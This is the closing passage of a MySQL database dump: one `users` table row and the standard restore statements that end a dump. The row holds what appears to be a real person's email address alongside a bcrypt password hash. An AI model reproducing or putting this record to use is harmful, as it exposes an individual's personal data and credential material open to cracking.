INSERT INTO `users` VALUES (2,'Loki',NULL,123123,'shalnev.a@inbox.ru',NULL,'$2y$10$BtFdnensuSubxuhKXaIhxuwGO3o1sKwvCFJ1UNlfvsCSFfKLejI0m',0,1,0,1,'asdasd',1,NULL,'2020-01-18 03:59:53','2020-01-18 03:59:53');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2020-01-20 18:13:44
